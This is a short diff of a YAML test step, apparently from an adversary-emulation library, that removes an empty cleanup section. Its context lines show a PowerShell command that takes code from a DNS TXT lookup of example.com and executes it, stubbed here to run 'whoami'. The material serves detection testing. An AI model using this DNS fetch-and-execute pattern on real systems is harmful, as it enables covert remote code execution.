@@ -22,6 +22,3 @@ steps:
         function nslookup  { &"$env:windir\system32\nslookup.exe" @args | Out-Null; @("","whoami")}
         powershell .(nslookup -q=txt example.com 8.8.8.8)[-1]
       executor: powershell
-      cleanup:
-        inline: ""
-        executor: powershell
